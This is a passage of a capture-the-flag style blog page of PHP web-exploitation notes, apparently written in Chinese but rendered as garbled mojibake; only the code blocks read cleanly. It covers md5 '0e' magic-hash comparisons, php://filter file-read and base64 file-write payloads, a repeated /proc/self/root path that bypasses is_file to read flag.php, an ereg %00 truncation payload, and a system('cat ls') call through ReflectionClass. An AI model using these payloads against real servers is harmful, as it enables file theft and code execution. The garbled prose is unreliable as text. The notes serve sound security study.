class="comment">//0cc175b9c0f1b6a831c399e269772661</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$str1</span>) == <span class="string">&#x27;0&#x27;</span>);<span class="comment">//bool(false)</span></span><br><span class="line">---------------------------------------------------------</span><br><span class="line"><span class="variable">$str2</span> = <span class="string">&quot;s224534898e&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">md5</span>(<span class="variable">$str2</span>);<span class="comment">//0e420233178946742799316739797882</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$str2</span>) == <span class="string">&#x27;0&#x27;</span>);<span class="comment">//bool(true)</span></span><br><span class="line">---------------------------------------------------------</span><br><span class="line"><span class="variable">$str3</span> = <span class="string">&#x27;a1b2edaced&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">md5</span>(<span class="variable">$str3</span>);<span class="comment">//0e45ea817f33691a3dd1f46af81166c4bool</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$str3</span>) == <span class="string">&#x27;0&#x27;</span>);<span class="comment">//bool(false)</span></span><br><span class="line">---------------------------------------------------------</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="string">&#x27;0e111111111111&#x27;</span> == <span class="string">&#x27;0&#x27;</span>);<span class="comment">//bool(true) </span></span><br></pre></td></tr></table></figure><ul><li>åªè¦æ˜¯ä»¥0eå¼€å¤´ï¼Œåé¢ä¸ºæ•°å­—çš„å­—ç¬¦ä¸²å’Œå­—ç¬¦ä¸²0æ¯”è¾ƒå€¼éƒ½æ˜¯ç›¸ç­‰çš„ï¼Œå› ä¸ºä¸ç®¡0ä¸è®ºå’Œå¤šå°‘ç›¸ä¹˜éƒ½æ˜¯0ã€‚</li><li>æ‰€ä»¥å½“hashå‡ºæ¥çš„32ä¸ªå€¼ï¼Œå¼€å¤´å‰ä¸¤ä¸ªä¸º0eï¼Œåé¢å…¨éƒ¨ä¸ºæ•°å­—çš„è¯ï¼Œä»–ä»¬å°±ä¼šå’Œå­—ç¬¦ä¸²0ç›¸ç­‰çš„ã€‚</li><li>ç¬¬ä¸€æ¡åªæ˜¯0å¼€å¤´ï¼Œæ‰€ä»¥åªèƒ½å½“æ™®é€šå­—ç¬¦ä¸²ï¼Œç»“æœä¸ºfalseã€‚</li><li>ç¬¬äºŒæ¡0eåé¢å…¨ä¸ºæ•°å­—ï¼Œç¬¦åˆè¦æ±‚ï¼Œç»“æœä¸ºtrueã€‚</li><li>ç¬¬ä¸‰æ¡è™½ç„¶ä¸º0eï¼Œä½†æ˜¯åé¢ä¸å…¨ä¸ºæ•°å­—ï¼Œæ‰€ä»¥ç»“æœä¸ºfalseã€‚</li></ul><h1 id="ä¼˜å…ˆçº§"><a href="#ä¼˜å…ˆçº§" class="headerlink" title="ä¼˜å…ˆçº§"></a>ä¼˜å…ˆçº§</h1><h2 id="ç¬¦å·"><a href="#ç¬¦å·" class="headerlink" title="ç¬¦å·"></a>ç¬¦å·</h2><ul><li>&amp;&amp;ä¸||çš„ä¼˜å…ˆçº§é«˜äº=</li><li>=çš„ä¼˜å…ˆçº§é«˜äºandä¸or</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$bA</span> = <span class="literal">true</span>;</span><br><span class="line"><span class="variable">$bB</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$b1</span> = <span class="variable">$bA</span> <span class="keyword">and</span> <span class="variable">$bB</span>;</span><br><span class="line"><span class="variable">$b2</span> = <span class="variable">$bA</span> &amp;&amp; <span class="variable">$bB</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$b1</span>); <span class="comment">// $b1 = true</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$b2</span>); <span class="comment">// $b2 = false</span></span><br><span class="line"><span class="variable">$bA</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$bB</span> = <span class="literal">true</span>;</span><br><span class="line"><span class="variable">$b3</span> = <span class="variable">$bA</span> <span class="keyword">or</span> <span class="variable">$bB</span>;</span><br><span class="line"><span class="variable">$b4</span> = <span class="variable">$bA</span> || <span class="variable">$bB</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$b3</span>); <span class="comment">// $b3 = false</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$b4</span>); <span class="comment">// $b4 = true</span></span><br></pre></td></tr></table></figure><h2 id="get-post"><a href="#get-post" class="headerlink" title="get post"></a>get post</h2><blockquote><p>httpåè®®é»˜è®¤å…ˆä»¥getæ–¹å¼è·å–æ•°æ®ï¼Œæ— è®ºæ˜¯å¦ä»¥å“ªç§æ–¹å¼å‘èµ·çš„ï¼Œæ€»æ˜¯getæ–¹å¼ä¼˜å…ˆï¼Œå³é€šè¿‡getæ–¹å¼è·å–åˆ°äº†æ•°æ®å°±ä¸ä¼šå†å»é€šè¿‡postæ–¹å¼è·å–ä¸€éï¼Œå¦‚æœgetæ–¹å¼è·å–ä¸åˆ°ï¼Œå†ä»¥postæ–¹å¼è·å–ã€‚</p></blockquote><h1 id="ReflectionClassåå°„ç±»"><a href="#ReflectionClassåå°„ç±»" class="headerlink" title="ReflectionClassåå°„ç±»"></a>ReflectionClassåå°„ç±»</h1><ul><li>å¯ä»¥å’Œsystemè¿ç”¨ï¼š<br><code>Reflectionclass(system(&#39;cat ls&#39;));</code></li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="built_in">static</span> <span class="variable">$flag</span>=<span class="string">&quot;flag&#123;123123123&#125;&quot;</span>;</span><br><span class="line"><span class="keyword">const</span>  PI=<span class="number">3.14</span>;</span><br><span class="line"><span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">hello</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;hello&lt;/br&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title class_">ReflectionClass</span>(<span class="string">&#x27;A&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$a</span>-&gt;<span class="title function_ invoke__">getConstants</span>());  <span class="comment">//è·å–ä¸€ç»„å¸¸é‡</span></span><br><span class="line">è¾“å‡º</span><br><span class="line"> <span class="keyword">array</span>(<span class="number">1</span>) &#123;</span><br><span class="line">  [<span class="string">&quot;PI&quot;</span>]=&gt;</span><br><span class="line">  <span class="keyword">float</span>(<span class="number">3.14</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$a</span>-&gt;<span class="title function_ invoke__">getName</span>());    <span class="comment">//è·å–ç±»å</span></span><br><span class="line">è¾“å‡º</span><br><span class="line"><span class="keyword">string</span>(<span class="number">1</span>) <span class="string">&quot;A&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$a</span>-&gt;<span class="title function_ invoke__">getStaticProperties</span>()); <span class="comment">//è·å–é™æ€å±æ€§</span></span><br><span class="line">è¾“å‡º</span><br><span class="line"><span class="keyword">array</span>(<span class="number">1</span>) &#123;</span><br><span class="line">  [<span class="string">&quot;flag&quot;</span>]=&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">15</span>) <span class="string">&quot;flag&#123;123123123&#125;&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$a</span>-&gt;<span class="title function_ invoke__">getMethods</span>()); <span class="comment">//è·å–ç±»ä¸­çš„æ–¹æ³•</span></span><br><span class="line">è¾“å‡º</span><br><span class="line"><span class="keyword">array</span>(<span class="number">1</span>) &#123;</span><br><span class="line">  [<span class="number">0</span>]=&gt;</span><br><span class="line">  <span class="keyword">object</span>(ReflectionMethod)<span class="comment">#2 (2) &#123;</span></span><br><span class="line">    [<span class="string">&quot;name&quot;</span>]=&gt;</span><br><span class="line">    <span class="keyword">string</span>(<span class="number">5</span>) <span class="string">&quot;hello&quot;</span></span><br><span class="line">    [<span class="string">&quot;class&quot;</span>]=&gt;</span><br><span class="line">    <span class="keyword">string</span>(<span class="number">1</span>) <span class="string">&quot;A&quot;</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="call-user-funcå›è°ƒå‡½æ•°"><a href="#call-user-funcå›è°ƒå‡½æ•°" class="headerlink" title="call_user_funcå›è°ƒå‡½æ•°"></a>call_user_funcå›è°ƒå‡½æ•°</h1><ul><li>call_user_func(callback,parameter)ï¼š<br>callbackï¼šè¢«è°ƒç”¨çš„å›è°ƒå‡½æ•°ï¼Œå…¶ä½™å‚æ•°æ˜¯å›è°ƒå‡½æ•°çš„å‚æ•°ï¼Œå°è¯•ç”¨hex2bin()ä½œä¸ºå›è°ƒå‡½æ•°ï¼ˆ16è¿›åˆ¶è½¬åŒ–ä¸ºASCII å­—ç¬¦ï¼‰</li><li>call_user_func()æ¥è°ƒç”¨ä¸€ä¸ªç±»é‡Œé¢çš„æ–¹æ³•<ul><li><code>call_user_func(array($classname, &#39;say_hello&#39;));</code><br>å°†è°ƒç”¨$calssnameç±»é‡Œé¢çš„<code>say_hello</code>çš„æ–¹æ³•</li></ul></li></ul><h1 id="PHPä¼ªåè®®"><a href="#PHPä¼ªåè®®" class="headerlink" title="PHPä¼ªåè®®"></a>PHPä¼ªåè®®</h1><h2 id="å†™æ–‡ä»¶"><a href="#å†™æ–‡ä»¶" class="headerlink" title="å†™æ–‡ä»¶"></a>å†™æ–‡ä»¶</h2><ul><li>é…åˆfile_put_contents(v3,str);å‡½æ•° //åœ¨éœ€è¦base64è½¬æ¢çš„æ—¶å€™</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">v3=php:<span class="comment">//filter/write=convert.base64-decode/resource=1.php&amp;str=......</span></span><br></pre></td></tr></table></figure><h2 id="è¯»æ–‡ä»¶"><a href="#è¯»æ–‡ä»¶" class="headerlink" title="è¯»æ–‡ä»¶"></a>è¯»æ–‡ä»¶</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$file</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\.\.\/|http|https|data|input|rot13|base64|string/i&#x27;</span>,<span class="variable">$file</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;hacker!&quot;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$file</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$file</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(! <span class="title function_ invoke__">is_file</span>(<span class="variable">$file</span>))&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="title function_ invoke__">filter</span>(<span class="variable">$file</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>é€šå¸¸ä½¿ç”¨ï¼š</li></ul><p><code>php://filter/read=convert.base64-encode/resource=flag.php</code></p><ul><li>å½“banæ‰base64çš„æ—¶å€™ï¼Œæˆ‘ä»¬è¿˜å¯ä»¥ç”¨å…¶ä»–ç¼–ç æ–¹å¼ï¼ˆæˆ–è€…ä¸ç¼–ç ï¼‰ï¼š</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">php:<span class="comment">//filter/resource=flag.php</span></span><br><span class="line">php:<span class="comment">//filter/convert.iconv.UCS-2LE.UCS-2BE/resource=flag.php</span></span><br><span class="line">php:<span class="comment">//filter/read=convert.quoted-printable-encode/resource=flag.php//å¯æ‰“å°å­—ç¬¦å¼•ç”¨ç¼–ç </span></span><br><span class="line">compress.zlib:<span class="comment">//flag.php//å‹ç¼©æµ</span></span><br></pre></td></tr></table></figure><h1 id="is-file-å‡½æ•°"><a href="#is-file-å‡½æ•°" class="headerlink" title="is_file()å‡½æ•°"></a>is_file()å‡½æ•°</h1><ul><li>åˆ¤æ–­æ˜¯å¦ä¸ºæ–‡ä»¶</li></ul><h2 id="phpä¼ªåè®®ç»•è¿‡"><a href="#phpä¼ªåè®®ç»•è¿‡" class="headerlink" title="phpä¼ªåè®®ç»•è¿‡"></a>phpä¼ªåè®®ç»•è¿‡</h2><blockquote><p>highlight_file()å¯ä»¥è¯†åˆ«phpä¼ªåè®® is_file()ä¸èƒ½è¯†åˆ«phpä¼ªåè®®</p></blockquote><h2 id="proc-self-root"><a href="#proc-self-root" class="headerlink" title="/proc/self/root"></a>/proc/self/root</h2><blockquote><p>åœ¨linuxä¸­/proc/self/rootæ˜¯æŒ‡å‘æ ¹ç›®å½•çš„ ä¹Ÿå°±æ˜¯å¦‚æœåœ¨å‘½ä»¤è¡Œä¸­è¾“å…¥ ls /proc/self/root<br>å…¶å®æ˜¾ç¤ºçš„å†…å®¹æ˜¯æ ¹ç›®å½•ä¸‹çš„å†…å®¹<br>å¤šæ¬¡é‡å¤åç»•è¿‡is_file</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file=/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/<span class="keyword">var</span>/www/html/flag.php</span><br></pre></td></tr></table></figure><h1 id="ereg-æˆªæ–­æ¼æ´"><a href="#ereg-æˆªæ–­æ¼æ´" class="headerlink" title="ereg()æˆªæ–­æ¼æ´"></a>ereg()æˆªæ–­æ¼æ´</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">ereg</span> (<span class="string">&quot;^[a-zA-Z]+$&quot;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>])===<span class="literal">FALSE</span>)  &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;error&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="title function_ invoke__">strrev</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))==<span class="number">0x36d</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>payload: c=a%00778</code>    åè½¬åï¼šc=877=0x36d</p><ul><li>strrev()ï¼š<br>åè½¬å­—ç¬¦ä¸²ï¼Œå¸¸å‡ºç°åœ¨%00æˆªæ–­æ¼æ´ä¸­<br>æ³¨ï¼š%00æ˜¯ä¸€ä¸ªæ•´ä½“ï¼Œä¸ä¼šåè½¬æˆ00% </li></ul><h1 id="Exceptionå¼‚å¸¸å¤„ç†ç±»"><a href="#Exceptionå¼‚å¸¸å¤„ç†ç±»" class="headerlink" title="Exceptionå¼‚å¸¸å¤„ç†ç±»"></a>Exceptionå¼‚å¸¸å¤„ç†ç±»</h1><ul><li>å’ŒReflectionClassåå°„ç±»ç”¨æ³•ç›¸ä¼¼ï¼Œè¯¥ç±»ä¸­å¸¸ç”¨çš„æˆå‘˜å‡½æ•°å¦‚ä¸‹æ‰€ç¤ºï¼š</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">getMessage</span>()ï¼šè¿”å›å¼‚å¸¸çš„æ¶ˆæ¯å†…å®¹ï¼›</span><br><span class="line"><span class="title function_ invoke__">getCode</span>()ï¼šä»¥æ•°å­—å½¢å¼è¿”å›å¼‚å¸¸ä»£ç ï¼›</span><br><span class="line"><span class="title function_ invoke__">getFile</span>()ï¼šè¿”å›å‘ç”Ÿå¼‚å¸¸çš„æ–‡ä»¶åï¼›</span><br><span class="line"><span class="title function_ invoke__">getLine</span>()ï¼šè¿”å›å‘ç”Ÿé”™è¯¯çš„ä»£ç è¡Œå·ï¼›</span><br><span class="line"><span class="title function_ invoke__">getTrace</span>()ï¼šè¿”å› <span class="title function_ invoke__">backtrace</span>() æ•°ç»„ï¼›</span><br><span class="line"><span class="title function_ invoke__">getTraceAsString</span>()ï¼šè¿”å›å·²æ ¼å¼åŒ–æˆå­—ç¬¦ä¸²çš„ã€ç”±å‡½æ•° <span class="title function_ invoke__">getTrace</span>() å‡½æ•°æ‰€äº§ç”Ÿçš„ä¿¡æ¯ï¼›</span><br><span class="line"><span class="title function_ invoke__">__toString</span>()ï¼šäº§ç”Ÿå¼‚å¸¸çš„å­—ç¬¦ä¸²ä¿¡æ¯ï¼Œå®ƒå¯ä»¥é‡è½½ã€‚æ³¨æ„ï¼Œè¯¥å‡½æ•°æœ€å‰éƒ¨æ˜¯ä¸¤ä¸ªä¸‹åˆ’çº¿ã€‚</span><br></pre></td></tr></table></figure><h1 id="FilesystemIteratorç±»è¯»å–æ–‡ä»¶"><a href="#FilesystemIteratorç±»è¯»å–æ–‡ä»¶" class="headerlink" title="FilesystemIteratorç±»è¯»å–æ–‡ä»¶"></a>FilesystemIteratorç±»è¯»å–æ–‡ä»¶</h1><ul><li>FilesystemIteratorè·å–æŒ‡å®šç›®å½•ä¸‹çš„æ‰€æœ‰æ–‡ä»¶</li><li>getcwd()å‡½æ•°ï¼šè·å–å½“å‰å·¥ä½œç›®å½• è¿”å›å½“å‰å·¥ä½œç›®å½•</li></ul><p><code>FilesystemIterator(getcwd());</code></p><h1 id="PHPå˜é‡"><a href="#PHPå˜é‡" class="headerlink" title="PHPå˜é‡"></a>PHPå˜é‡</h1><h2 id="SERVER"><a href="#SERVER" class="headerlink" title="$_SERVER"></a>$_SERVER</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="variable">$_SERVER</span>[<span class="string">&#x27;PHP_SELF&#x27;</span>].<span class="string">&quot;&lt;br&gt;&quot;</span>;<span class="comment">//å½“å‰è¿è¡Œçš„æ–‡ä»¶</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$_SERVER</span>[<span class="string">&#x27;SERVER_ADDR&#x27;</span>].<span class="string">&quot;&lt;br&gt;&quot;</span>;<span class="comment">//æœ¬åœ°åœ°å€</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$_SERVER</span>[<span class="string">&#x27;SERVER_NAME&#x27;</span>].<span class="string">&quot;&lt;br&gt;&quot;</span>;<span class="comment">//æ‰€åœ¨æœåŠ¡å™¨çš„ä¸»æœºå</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$_SERVER</span>[<span class="string">&#x27;SERVER_PROTOCOL&#x27;</span>].<span class="string">&quot;&lt;br&gt;&quot;</span>;<span class="comment">//è¯·æ±‚é¡µé¢æ—¶HTTP(é€šä¿¡åè®®)çš„åç§°å’Œç‰ˆæœ¬</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_METHOD&#x27;</span>].<span class="string">&quot;&lt;br&gt;&quot;</span>;<span class="comment">//è®¿é—®é¡µé¢ä½¿ç”¨çš„è¯·æ±‚æ–¹æ³•</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$_SERVER</span>[<span class="string">&#x27;DOCUMENT_ROOT&#x27;</span>].<span class="string">&quot;&lt;br&gt;&quot;</span>;<span class="comment">//è¿è¡Œæ–‡ä»¶çš„æ‰€åœ¨ç›®å½•ï¼ˆç»å¯¹è·¯å¾„ï¼‰</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_ACCEPT_LANGUAGE&#x27;</span>].<span class="string">&quot;&lt;br&gt;&quot;</span>;<span class="comment">//å½“å‰è¯·æ±‚å¤´ä¸­ Accept-Language</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$_SERVER</span>[<span class="string">&#x27;SCRIPT_FILENAME&#x27;</span>].<span class="string">&quot;&lt;br&gt;&quot;</span>;<span class="comment">//è¿è¡Œæ–‡ä»¶çš„æ–‡ä»¶åï¼ˆç»å¯¹è·¯å¾„ï¼‰</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$_SERVER</span>[<span class="string">&#x27;SCRIPT_NAME&#x27;</span>];<span class="comment">//å½“å‰è¿è¡Œçš„è„šæœ¬çš„æ–‡ä»¶ã€</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_URI&#x27;</span>];<span class="comment">//URI ç”¨æ¥æŒ‡å®šè¦è®¿é—®çš„é¡µé¢ã€‚</span></span><br><span class="line"></span><br><span class="line"><span class="number">1</span>ï¼Œhttp:<span class="comment">//localhost/aaa/ (æ‰“å¼€aaaä¸­çš„index.php)</span></span><br><span class="line">ç»“æœï¼š</span><br><span class="line"><span class="variable">$_SERVER</span>[<span class="string">&#x27;QUERY_STRING&#x27;</span>] = <span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_URI&#x27;</span>] = <span class="string">&quot;/aaa/&quot;</span>;</span><br><span class="line"><span class="variable">$_SERVER</span>[<span class="string">&#x27;SCRIPT_NAME&#x27;</span>] = <span class="string">&quot;/aaa/index.php&quot;</span>;</span><br><span class="line"><span class="variable">$_SERVER</span>[<span class="string">&#x27;PHP_SELF&#x27;</span>] = <span class="string">&quot;/aaa/index.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="number">2</span>ï¼Œhttp:<span class="comment">//localhost/aaa/?p=222 (é™„å¸¦æŸ¥è¯¢)</span></span><br><span class="line">ç»“æœï¼š</span><br><span class="line"><span class="variable">$_SERVER</span>[<span class="string">&#x27;QUERY_STRING&#x27;</span>] = <span class="string">&quot;p=222&quot;</span>;</span><br><span class="line"><span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_URI&#x27;</span>] = <span class="string">&quot;/aaa/?p=222&quot;</span>;</span><br><span class="line"><span class="variable">$_SERVER</span>[<span class="string">&#x27;SCRIPT_NAME&#x27;</span>] = <span class="string">&quot;/aaa/index.php&quot;</span>;</span><br><span class="line"><span class="variable">$_SERVER</span>[<span class="string">&#x27;PHP_SELF&#x27;</span>] = <span class="string">&quot;/aaa/index.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="number">3</span>ï¼Œhttp:<span class="comment">//localhost/aaa/index.php?p=222&amp;q=333</span></span><br><span class="line">ç»“æœï¼š</span><br><span class="line"><span class="variable">$_SERVER</span>[<span class="string">&#x27;QUERY_STRING&#x27;</span>] = <span class="string">&quot;p=222&amp;q=333&quot;</span>;</span><br><span class="line"><span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_URI&#x27;</span>] = <span class="string">&quot;/aaa/index.php?p=222&amp;q=333&quot;</span>;</span><br><span class="line"><span class="variable">$_SERVER</span>[<span class="string">&#x27;SCRIPT_NAME&#x27;</span>] = <span class="string">&quot;/aaa/index.php&quot;</span>;</span><br><span class="line"><span class="variable">$_SERVER</span>[<span class="string">&#x27;PHP_SELF&#x27;</span>] = <span class="string">&quot;/aaa/index.php&quot;</span>;</span><br><span class="line"></span><br><span class="line">ç”±å®ä¾‹å¯çŸ¥ï¼š</span><br><span class="line"><span class="variable">$_SERVER</span>[<span class="string">&quot;QUERY_STRING&quot;</span>] è·å–æŸ¥è¯¢ è¯­å¥ï¼Œå®ä¾‹ä¸­å¯çŸ¥ï¼Œè·å–çš„æ˜¯?åé¢çš„å€¼</span><br><span class="line"><span class="variable">$_SERVER</span>[<span class="string">&quot;REQUEST_URI&quot;</span>] è·å– http:<span class="comment">//localhost åé¢çš„å€¼ï¼ŒåŒ…æ‹¬/</span></span><br><span class="line"><span class="variable">$_SERVER</span>[<span class="string">&quot;SCRIPT_NAME&quot;</span>] è·å–å½“å‰è„šæœ¬çš„è·¯å¾„ï¼Œå¦‚ï¼šindex.php</span><br><span class="line"><span class="variable">$_SERVER</span>[<span class="string">&quot;PHP_SELF&quot;</span>] å½“å‰æ­£åœ¨æ‰§è¡Œè„šæœ¬çš„æ–‡ä»¶å</span><br></pre></td></tr></table></figure><ul><li><code>$_SERVER[&#39;argv&#39;]</code><ul><li><code>$argv</code>ï¼šä¼ é€’ç»™è„šæœ¬çš„å‚æ•°æ•°ç»„</li></ul></li><li>ç½‘é¡µæ¨¡å¼ä¸‹ï¼š<br><code>$_SERVER[â€˜argvâ€™][0] = $_SERVER[â€˜QUERY_STRINGâ€™]</code></li></ul><blockquote><p>CLIæ¨¡å¼ä¸‹ç›´æ¥æŠŠ request info â¾¥â¾¯çš„argvå€¼å¤åˆ¶åˆ°arræ•°ç»„ä¸­å»<br>ç»§ç»­åˆ¤æ–­query stringæ˜¯å¦ä¸ºç©ºï¼Œ<br>å¦‚æœä¸ä¸ºç©ºæŠŠé€šè¿‡+ç¬¦å·åˆ†å‰²çš„å­—ç¬¦ä¸²è½¬æ¢æˆphpå†…éƒ¨çš„zend_stringï¼Œ<br>ç„¶åå†æŠŠè¿™ä¸ªzend_stringå¤åˆ¶åˆ° arr æ•°ç»„ä¸­å»ã€‚</p></blockquote><h2 id="GLOBALS"><a href="#GLOBALS" class="headerlink" title="$GLOBALS"></a>$GLOBALS</h2><ul><li>å‚¨å­˜å…¨å±€ä½œç”¨åŸŸä¸­çš„å˜é‡</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getFlag</span>(<span class="params">&amp;<span class="variable">$v1</span>,&amp;<span 